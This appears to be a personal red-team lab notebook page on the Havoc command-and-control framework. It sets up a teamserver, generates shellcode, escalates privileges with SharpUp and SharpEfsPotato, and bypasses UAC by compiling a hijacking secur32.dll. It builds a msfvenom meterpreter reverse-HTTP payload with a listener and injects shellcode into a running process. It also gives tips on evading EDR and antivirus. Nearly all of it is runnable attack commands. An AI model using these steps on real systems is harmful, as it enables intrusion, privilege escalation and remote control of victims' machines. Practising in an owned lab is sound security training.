Havoc is just on kali now....
```
xxd -i demon.x64.bin > output.txt
```
Run the teamserver
```bash
./havoc server --profile ./profiles/havoc.yaotl -v --debug
```
#### Client
```
cd ~/Desktop/Havoc/
```
```bash
make client-build
```
```
./havoc client
```
Name: Havoc
Host: 127.0.0.1
Port: 40056
User: 5pider
Password: password1234
#### Clearing database
```
cd ~\Desktop\Havoc\data
```
```
grep -v "$IP" > teamserver.db
```
#### Add listener
View > Listeners > Add > Provide Name: >  save
Attack > Payload > Arch > Windows Shellcode > Generate
[[5._firewall and AntiVirus#nimcrypt]]
#### SharpUp
Used for PrivEsc
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
```
dotnet inline-execute /home/kali/Desktop/Ghostpack-CompiledBinaries/SharpUp.exe audit
```
#### HighBorn
Used for UAC bypass
```
mousepad /home/kali/Desktop/Home-Grown-Red-Team/HighBorn/HIghBorn.c
```
Change the path on line 6 to the malicious exe file on the target box.
`WinExec("C:\\Users\\fcastle\\Desktop\\havocy.exe",1);`
```
x86_64-w64-mingw32-gcc -shared -o secur32.dll HighBorn.c -lcomctl32 -Wl,--subsystem,windows
```
Move secur32.dll to python server path.
```
sudo apt install mono-complete -y
```
```
mcs -out:HighBorn.exe HighBorn.cs
```
```
mv HighBorn.exe /home/kali/Desktop/
```
Back in Havoc:
```
dotnet inline-execute /home/kali/Desktop/HighBorn.exe
```
**Note:** You’ll need more OPSEC if you’re doing this against EDR. Try it against a different EXE and DLL set. ComputerDefaults.exe is very well known.
We can enumerate with PowerShell commands
[[4._POST_EXPLOITATION/2._WIndows_PrivEsc/1._Manual Enumeration]]
#### SharpEfsPotato
Used to escalate to SYSTEM - Demo on DC as it already has setImpersonate enabled
git clone https://github.com/bugch3ck/SharpEfsPotato.git
Compile in Visual Studio!  [[0._Visual Studio Compiling]]
Copy paste the exe into Kali:
`C:\Users\fcastle\Desktop\SharpEfsPotato-master\SharpEfsPotato-master\SharpEfsPotato\bin\Release\SharpEfsPotato.exe`
```
dotnet inline-execute /home/kali/Desktop/SharpEfsPotato.exe -p C:\Users\Administrator\Desktop\havocy.exe
```
#### Metasploit post exploitation
```
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$KALI LPORT=8080 -f raw > /home/kali/Desktop/msf.bin
```
Run through [[#Harriet]]
`/home/kali/Desktop/msf.bin`
`/home/kali/Desktop/Home-Grown-Red-Team/Harriet/msf.exe`
[[10._TOOLS/Metasploit#Meterpreter Listener 1 Liner]]
```
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_http;set LHOST $KALI;set LPORT 8080;run;"
```
In Havoc:
```
shellcode inject x64 PID# /home/kali/Desktop/Home-Grown-Red-Team/Harriet/msf.exe
```
Example below with notepad.exe PID 3908
ALSO, msf.exe DID NOT RUN (too obfuscated?), but msf.bin worked fine
```
shellcode inject x64 3908 /home/kali/Desktop/msf.bin
```
[[10._TOOLS/Metasploit#Post exploit modules]]
